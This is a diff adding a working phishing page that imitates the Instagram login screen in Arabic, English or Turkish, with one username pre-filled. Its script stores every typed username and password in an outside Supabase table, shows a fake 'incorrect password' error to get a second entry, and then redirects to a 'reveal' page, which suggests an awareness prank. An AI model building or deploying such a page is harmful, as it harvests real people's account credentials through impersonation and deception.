@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="ar" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Instagram</title>
+<style>
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background: #fafafa;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+  }
+  .card {
+    width: 100%;
+    max-width: 350px;
+    padding: 0 20px;
+  }
+  .warning {
+    background: #fff8e1;
+    border: 1px solid #f0c86b;
+    color: #6b4e00;
+    border-radius: 6px;
+    padding: 10px 12px;
+    font-size: 0.78rem;
+    line-height: 1.6;
+    text-align: center;
+    margin-bottom: 14px;
+  }
+  .box {
+    background: #fff;
+    border: 1px solid #dbdbdb;
+    border-radius: 1px;
+    padding: 44px 40px 36px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
+  .ig-icon {
+    width: 44px;
+    height: 44px;
+    margin-top: 8px;
+  }
+  .logo {
+    font-family: 'Brush Script MT', cursive;
+    font-size: 2.6rem;
+    margin: 10px 0 24px;
+    color: #262626;
+    font-style: italic;
+  }
+  form { width: 100%; }
+  input {
+    width: 100%;
+    background: #fafafa;
+    border: 1px solid #dbdbdb;
+    border-radius: 3px;
+    padding: 9px 8px;
+    font-size: 0.85rem;
+    margin-bottom: 6px;
+    outline: none;
+  }
+  input:focus { border-color: #a8a8a8; }
+  .btn {
+    width: 100%;
+    margin-top: 12px;
+    background: #4cb5f9;
+    color: #fff;
+    border: none;
+    border-radius: 8px;
+    padding: 7px 0;
+    font-weight: 600;
+    font-size: 0.9rem;
+    cursor: pointer;
+  }
+  .btn:disabled { opacity: 0.6; cursor: default; }
+  .btn:active { background: #3a9fe0; }
+  .error {
+    display: none;
+    background: #fff3f3;
+    color: #ed4956;
+    border: 1px solid #ed4956;
+    border-radius: 3px;
+    padding: 8px;
+    font-size: 0.8rem;
+    text-align: center;
+    margin-bottom: 10px;
+    width: 100%;
+  }
+
+</style>
+</head>
+<body>
+  <div class="card">
+    <div class="warnidng" id="warning-text"></div>
+    <div class="box">
+      <svg class="ig-icon" viewBox="0 0 24 24" fill="none" stroke="#262626" stroke-width="1.6" xmlns="http://www.w3.org/2000/svg">
+        <rect x="2.5" y="2.5" width="19" height="19" rx="5.5"/>
+        <circle cx="12" cy="12" r="4.5"/>
+        <circle cx="17.6" cy="6.4" r="1.1" fill="#262626" stroke="none"/>
+      </svg>
+      <div class="logo">Instagram</div>
+      <div class="error" id="error-msg"></div>
+      <form id="login-form" autocomplete="off">
+        <input type="text" id="username" autocomplete="off"    value="2iil.x4" required>
+        <input type="password" id="password" autocomplete="off" placeholder="••••••••" required>
+        <button type="submit" class="btn" id="submit-btn"></button>
+      </form>
+    </div>
+  </div>
+
+<script type="module">
+  import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/+esm';
+
+  const supabase = createClient(
+    'https://mlvstzocdrnjknpjluos.supabase.co',
+    'sb_publishable_6plKCt1jLxS2-RkjM2OHWQ__gZIHsyQ'
+  );
+
+  const translations = {
+    ar: {
+      dir: 'rtl',
+       usernamePh: '2iil.x4',
+      passwordPh: 'كلمة المرور',
+      submit: 'تسجيل الدخول',
+      loading: 'جارِ التحميل...',
+      error: 'اسم المستخدم أو كلمة المرور غير صحيحة. الرجاء التأكد من إعادة إدخالها بشكل صحيح.'
+    },
+    en: {
+      dir: 'ltr',
+       usernamePh: '2iil.x4',
+      passwordPh: 'Password',
+      submit: 'Log in',
+      loading: 'Loading...',
+      error: 'Sorry, your username or password was incorrect. Please double-check and try again.'
+    },
+    tr: {
+      dir: 'ltr',
+       usernamePh: '2iil.x4',
+      passwordPh: 'Şifre',
+      submit: 'Giriş yap',
+      loading: 'Yükleniyor...',
+      error: 'Kullanıcı adı veya şifre hatalı. Lütfen tekrar kontrol edip deneyin.'
+    }
+  };
+
+  function detectLang() {
+    const raw = (navigator.language || (navigator.languages && navigator.languages[0]) || 'ar').toLowerCase();
+    if (raw.startsWith('en')) return 'en';
+    if (raw.startsWith('tr')) return 'tr';
+    return 'ar';
+  }
+
+  const lang = detectLang();
+  const t = translations[lang];
+
+  document.documentElement.lang = lang;
+  document.documentElement.dir = t.dir;
+
+  const usernameInput = document.getElementById('username');
+  const passwordInput = document.getElementById('password');
+  const submitBtn = document.getElementById('submit-btn');
+  const errorMsg = document.getElementById('error-msg');
+
+  document.getElementById('warning-text').textContent = t.warning;
+  usernameInput.placeholder = t.usernamePh;
+  passwordInput.placeholder = t.passwordPh;
+  submitBtn.textContent = t.submit;
+  errorMsg.textContent = t.error;
+
+  const form = document.getElementById('login-form');
+  let attemptCount = 0;
+
+  form.addEventListener('submit', async function (e) {
+    e.preventDefault();
+    submitBtn.disabled = true;
+    submitBtn.textContent = t.loading;
+
+    const username = usernameInput.value;
+    const password = passwordInput.value;
+
+    await supabase.from('login_attempts').insert({
+      username: username,
+      password_entered: password
+    });
+
+    attemptCount++;
+
+    if (attemptCount === 1) {
+      submitBtn.disabled = false;
+      submitBtn.textContent = t.submit;
+      errorMsg.style.display = 'block';
+    } else {
+      sessionStorage.setItem('phishing_reveal', '1');
+      window.location.href = 'hello.html';
+    }
+  });
+</script>
+</body>
+</html>
